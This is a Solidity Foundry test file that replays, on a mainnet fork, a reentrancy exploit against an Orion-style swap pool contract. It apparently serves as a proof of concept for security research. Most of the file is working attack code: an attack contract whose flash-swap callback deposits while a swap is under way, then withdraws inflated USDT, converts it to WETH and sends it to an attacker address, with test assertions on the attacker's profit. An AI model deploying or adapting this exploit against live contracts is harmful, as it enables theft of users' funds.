
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 16542147;
    uint256 constant TX_TIMESTAMP = 1675353395;
    uint256 constant TX_BLOCK_NUMBER = 16542148;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _snapEcon();
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        economicOracles.push(
            EconomicOracle(
                Addresses.UNI_V2_689F, Addresses.ATK, "ATK", "position_delta", true, 99680123783317, false
            )
        );
        economicOracles.push(
            EconomicOracle(Addresses.UNI_V2_689F, Addresses.USDT, "USDT", "position_delta", false, 99, false)
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.A_4E68CC_FA36,
                Addresses.WETH,
                "WETH",
                "position_delta",
                false,
                293788317482566649246,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.A_4E68CC_FA36, Addresses.USDT, "USDT", "position_delta", true, 510599749265, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.UNI_V2_03D2, Addresses.ATK, "ATK", "position_delta", false, 99680123783317, false
            )
        );
        economicOracles.push(
            EconomicOracle(Addresses.UNI_V2_03D2, Addresses.USDC, "USDC", "position_delta", true, 100, false)
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.A_B5599F_45AA, Addresses.USDC, "USDC", "position_delta", true, 499900, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.A_B5599F_45AA, Addresses.USDT, "USDT", "position_delta", false, 2844766426324, false
            )
        );
    }
}

contract OurAttack {




    function attack() external payable {
        _attack();
    }

    function _swapCb() internal {
        _markCallback(0);
        IUSDC(Addresses.USDC).decimals();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(11)),
                bytes32(uint256(2596148429267413814265248164610048010000))
            );
        IContract_B5599F_45AA(Addresses.A_B5599F_45AA)
            .swapThroughOrionPool(
                uint112(10000),
                uint112(0),
                _addressArray3(Addresses.USDC, Addresses.ATK, Addresses.USDT),
                true
            );
        IUSDT(Addresses.USDT).decimals();
        IContract_B5599F_45AA(Addresses.A_B5599F_45AA).getBalance(Addresses.USDT, address(this));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_B5599F_45AA);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_B5599F_45AA);
        IContract_B5599F_45AA(Addresses.A_B5599F_45AA).withdraw(Addresses.USDT, uint112(5689532852749));
        uint256 usdtTransferAmount = 2853326405542;
        IERC20Like(Addresses.USDT).transfer(Addresses.UNI_V2, usdtTransferAmount);
    }

    function _attack() internal {
        IUNI_V2(Addresses.UNI_V2).token0();
        IUNI_V2(Addresses.UNI_V2).token1();
        IERC20Like(Addresses.USDT).allowance(address(this), Addresses.A_B5599F_45AA);
        IERC20Like(Addresses.USDT).approve(Addresses.A_B5599F_45AA, type(uint256).max);
        IERC20Like(Addresses.USDC).allowance(address(this), Addresses.A_B5599F_45AA);
        IERC20Like(Addresses.USDC).approve(Addresses.A_B5599F_45AA, type(uint256).max);
        IERC20Like(Addresses.USDC).allowance(address(this), Addresses.UNI_V2_689F);
        IERC20Like(Addresses.USDC).approve(Addresses.UNI_V2_689F, type(uint256).max);
        IContract_B5599F_45AA(Addresses.A_B5599F_45AA).depositAsset(Addresses.USDC, uint112(500000));
        {
            bytes memory swapProof = abi.encode(Addresses.USDT, 0x00000000000000000000000000000296594AD4d5);
            IUniswapV2PairLike(Addresses.UNI_V2).swap(0, 2844766426325, address(this), swapProof);
        }
        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).approve(Addresses.SwapRouter, usdtBalanceOfAttackAttackContract);
        {
            uint256 swapAmt = 2836206447207;
            ISwapRouter(Addresses.SwapRouter)
                .exactInputSingle(
                    Abi_exactInputSingle_Param0({
                        field0: Addresses.USDT,
                        field1: Addresses.WETH,
                        field2: 3000,
                        field3: Addresses.A_3DABF5_35F1,
                        field4: 1675353395,
                        field5: swapAmt,
                        field6: 0,
                        field7: 0
                    })
                );
        }
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.WETH).transfer(Addresses.A_3DABF5_35F1, 0);
        if (address(this).balance > 0) {
            (bool ok,) = payable(Addresses.A_3DABF5_35F1).call{value: address(this).balance}("");
            require(ok, "selfdestruct beneficiary transfer failed");
        }
    }

    function _callback() internal {
        _markCallback(2);
        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IContract_B5599F_45AA(Addresses.A_B5599F_45AA)
            .depositAsset(Addresses.USDT, uint112(usdtBalanceOfAttackAttackContract));
    }

    receive() external payable {}

    function uniswapV2Call(address arg0, uint256 amount, uint256 amount1, bytes calldata arg3) external payable {
        arg0;
        amount;
        amount1;
        arg3;
        _swapCb();
        return;
    }

    function start() external payable {
        _attack();
        return;
    }

    function deposit() external payable {
        _callback();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray3(address a0, address a1, address a2) internal pure returns (address[] memory out) {
        out = new address[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant UNI_V2 = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address internal constant UNI_V2_689F = 0x13e557c51C0a37E25E051491037Ee546597c689F;
    address internal constant A_3DABF5_35F1 = 0x3DabF5e36DF28F6064a7c5638D0c4e01539E35F1;
    address internal constant A_420A50_EAC8 = 0x420a50A62b17C18b36C64478784536bA980feAc8;
    address internal constant A_4E68CC_FA36 = 0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36;
    address internal constant attack_contract = 0x5061F7e6dfc1a867D945d0ec39Ea2A33f772380A;
    address internal constant ATK = 0x64Acd987A8603EeAF1ee8E87Addd512908599Aec;
    address internal constant UNI_V2_03D2 = 0x76fe189e4fA5Ff997872DDF44023B04Cd7Cb03d2;
    address internal constant attacker_eoa = 0x837962b686Fd5A407fb4e5f92E8Be86A230484Bd;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant A_A2327A_BDCF = 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF;
    address internal constant A_B5599F_45AA = 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
}

struct Abi_exactInputSingle_Param0 {
    address field0;
    address field1;
    uint24 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint160 field7;
}

interface IContract_B5599F_45AA {
    function depositAsset(address, uint112) external;
    function getBalance(address, address) external view returns (uint256);
    function swapThroughOrionPool(uint112, uint112, address[] calldata, bool) external;
    function withdraw(address, uint112) external;
}

interface ISwapRouter {
    function exactInputSingle(Abi_exactInputSingle_Param0 calldata) external returns (uint256);
}

interface IUNI_V2 {
    function token0() external view returns (uint256);
    function token1() external view returns (uint256);
}

interface IUSDC {
    function decimals() external view returns (uint256);
}

interface IUSDT {
    function decimals() external view returns (uint256);
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
